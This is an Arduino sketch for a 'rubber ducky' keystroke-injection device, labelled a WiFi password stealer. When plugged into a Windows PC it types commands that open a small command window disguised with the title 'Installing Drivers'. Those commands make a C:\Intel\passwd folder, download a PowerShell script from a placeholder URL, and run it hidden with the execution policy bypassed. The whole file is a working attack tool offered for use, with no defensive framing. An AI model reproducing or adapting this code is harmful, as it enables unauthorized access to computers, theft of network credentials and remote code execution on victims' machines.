/*
 * 
 *WIFI Password Stealer for Arduino pro micro rubber ducky - Coded by SpeedCuber
 *Change http://0.0.0.0/wifi/wifi.PS1 with wifi.PS1 download link
 * 
 */

#include "Keyboard.h"

void typeKey(int key)
{
  Keyboard.press(key);
  delay(50);
  Keyboard.release(key);
}

void setup()
{
  
  wifi();
  
}

void wifi()
{

// --> Initial delay ,Back to desktop and open run.
 deskrun();
 
 // --> Obfuscate the command prompt
 Keyboard.print("cmd /T:01 /K mode con:COLS=15 LINES=1 &&title Installing Drivers");
 delay(300);
 typeKey(KEY_RETURN);
 
 // --> Creating Temporary Directories
 delay(100);
 Keyboard.print("cd / & mkdir Intel & cd Intel & mkdir passwd & cd passwd");
 typeKey(KEY_RETURN);
 delay(300);

 // --> Download and execute the wifi.PS1
 Keyboard.print(F("echo (wget  http://0.0.0.0/wifi/wifi.PS1 -OutFile wifi.PS1) > wifi.PS1 ")); 
 typeKey(KEY_RETURN);
 delay(300);
 Keyboard.print(F("powershell -windowstyle hidden  -ExecutionPolicy ByPass -File wifi.ps1"));
 typeKey(KEY_RETURN);
 delay(300);

 Keyboard.press(KEY_UP_ARROW);
 typeKey(KEY_RETURN);
  
 Keyboard.end();
  
  }

void deskrun()
{
  delay(3000);
  Keyboard.begin();
  // --> Back to Desktop
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('d');
  Keyboard.releaseAll();
  delay(500);
  // --> Open run
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('r');
  Keyboard.releaseAll();

  delay(700);
  
  }
  
/* Unused endless loop */
void loop() {}
